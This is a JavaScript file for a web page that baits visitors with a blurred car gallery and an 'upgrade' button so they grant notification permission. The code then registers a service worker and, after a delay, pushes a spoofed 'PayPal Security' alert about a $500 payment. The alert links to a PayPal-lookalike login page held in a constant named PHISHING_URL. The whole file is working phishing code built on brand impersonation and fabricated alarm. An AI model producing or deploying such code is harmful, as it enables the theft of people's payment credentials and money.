const upgradeBtn = document.getElementById('upgrade-btn');
const carImage = document.getElementById('car-image');
const overlay = document.getElementById('overlay');
const statusMsg = document.getElementById('status-msg');

// CONFIGURATION
const PHISHING_URL = "https://paypal-login-alpha.vercel.app/"; 
const NOTIFICATION_DELAY = 10000; // 10 seconds for testing. Change to 3600000 for 1 hour.
const ICON_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQy72bmfzwAaMSUUtH8YRzge_DHAIoJRBc1ivrWctAv1w&s";

upgradeBtn.addEventListener('click', async () => {
    // 1. Visual Transition
    carImage.classList.remove('blurred');
    overlay.style.opacity = '0';
    setTimeout(() => overlay.style.display = 'none', 800);
    
    statusMsg.innerText = "Upgrading resolution...";

    // 2. Request Permission for System Notification
    try {
        const permission = await Notification.requestPermission();
        if (permission === 'granted') {
            statusMsg.innerText = "Resolution Unlocked. Enjoy the gallery.";
            
            // Register Service Worker
            const registration = await navigator.serviceWorker.register('sw.js');

            // 3. Schedule the delayed notification
            scheduleNotification(registration, PHISHING_URL);
        } else {
            statusMsg.innerText = "Please allow notifications to continue.";
        }
    } catch (err) {
        console.error(err);
    }
});

async function scheduleNotification(registration, url) {
    // This simulates the delay before the pop-up appears
    setTimeout(() => {
        registration.showNotification('PayPal Security', {
            body: 'You sent $500 to Jennifer Carl. View transaction.',
            icon: ICON_URL, 
            badge: ICON_URL,
            tag: 'paypal-alert',
            data: { url: url },
            requireInteraction: true 
        });
    }, NOTIFICATION_DELAY);
}
